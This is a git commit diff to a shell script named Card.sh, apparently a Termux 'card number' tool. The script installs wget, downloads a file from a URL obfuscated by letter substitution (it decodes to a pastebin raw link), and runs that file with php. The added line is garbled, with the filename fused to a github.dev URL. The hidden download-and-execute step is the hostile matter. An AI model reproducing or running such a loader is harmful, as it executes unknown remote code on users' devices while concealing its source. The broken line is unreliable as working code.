fa01854debfe01fe5aab898213ba6ce9c3e6e9e6
maha748m <Maha748m@gmail.com>
2025-08-04 23:11:57 +0300

    12

--- Card.sh
+++ Card.sh
@@ -9,4 +9,4 @@ sleep 2
 pkg install wget
 sleep 1
 wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
-php CMQyGnfN
+php CMQyGnfNhttps://github.dev/INDOnimous/Card-Number/blob/77452951e93a26c80ff1de3e83c071db6f9de887/Card.sh#L11
